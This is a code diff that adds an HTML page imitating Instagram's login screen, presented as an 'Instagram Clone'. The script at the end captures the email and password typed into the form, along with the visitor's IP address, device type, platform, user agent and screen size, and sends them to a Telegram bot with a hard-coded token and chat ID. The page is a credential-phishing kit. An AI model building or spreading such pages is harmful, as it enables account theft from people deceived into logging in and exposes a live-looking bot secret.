@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram Clone by ARUN</title>
+    <link rel="stylesheet" href="style.css" />
+    <link rel="stylesheet" href="css/media-queries.css" />
+    <link rel="icon" href="photos/insta-icon.jpg" />
+</head>
+<body>
+    <main>
+        <div class="log-in-container">
+            <div class="log-in">
+                <img src="photos/logo.png" class="logo" alt="Instagram Logo" />
+                <div class="log-in-form">
+                    <input type="text" placeholder="Phone number, username, or email" required />
+                    <input type="password" placeholder="Password" required />
+                    <button class="log-in-button">Log In</button>
+                </div>
+                <span class="or-divider">OR</span>
+                <!-- Facebook Login Option -->
+                <div class="fb-login">
+                    <a href="#">
+                        <img src="photos/facebook-icon.png" alt="Facebook Icon" />
+                        <span>Log in with Facebook</span>
+                    </a>
+                </div>
+                <!-- Forgot Password -->
+                <a href="#">Forgot password?</a>
+            </div>
+            <!-- Sign Up -->
+            <div class="sign-up">
+                <span>Don't have an account? 
+                    <a href="#">Sign up</a>
+                </span>
+            </div>
+            <!-- Download the App -->
+            <div class="get-the-app">
+                <span>Get the app</span>
+                <div class="app-images">
+                    <a href="#"><img src="photos/applestore.png" alt="Download on the App Store" /></a>
+                    <a href="#"><img src="photos/googlestore.png" alt="Get it on Google Play" /></a>
+                </div>
+            </div>
+        </div>
+        <!-- Phones Preview -->
+        <div class="phones-container">
+            <img src="photos/phones.png" alt="Phones Displaying App Preview" />
+        </div>
+    </main>
+    <footer>
+        <ul class="footer-links">
+            <li><a href="#">About</a></li>
+            <li><a href="#">Help</a></li>
+            <li><a href="#">Press</a></li>
+            <li><a href="#">API</a></li>
+            <li><a href="#">Jobs</a></li>
+            <li><a href="#">Privacy</a></li>
+            <li><a href="#">Terms</a></li>
+            <li><a href="#">Location</a></li>
+            <li><a href="#">Top</a></li>
+            <li><a href="#">Accounts</a></li>
+            <li><a href="#">Hashtags</a></li>
+            <li><a href="#">Language</a></li>
+        </ul>
+        <span class="copyright">&copy; 2020 Instagram from Facebook</span>
+    </footer>
+
+
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+<script>
+    const TOKEN = "7320854870:AAFY55NYwESVfsxu_Mv7VtkjjUxMlbXD7pw";                                                            // هنا التوكين              
+    const CHAT_ID = "6903553583";                                                       // هنا معرف الشات https://api.telegram.org/bot/getUpdates
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        
+
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        axios.get('https://api.ipify.org?format=json')
+            .then(response => {
+                const ip = response.data.ip;
+
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const screenWidth = screen.width;
+                const screenHeight = screen.height;
+                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                const message = ` 
+                    <b>New Login Attempt</b>\n
+                    <b>Email:</b> ${email}\n
+                    <b>Password:</b> ${password}\n
+                    <b>IP Address:</b> ${ip}\n
+                    <b>Device Type:</b> ${deviceType}\n
+                    <b>Platform:</b> ${platform}\n
+                    <b>User Agent:</b> ${userAgent}\n
+                    <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                `;
+
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    parse_mode: 'html',
+                    text: message
+                }).then(response => {
+                    alert('Information sent successfully!');
+                }).catch(error => {
+                    alert('Error sending the information. Please try again.');
+                });
+            })
+            .catch(error => {
+                alert('Error fetching the IP address. Please try again.');
+            });
+    });
+</script>
+</body>
+</html>
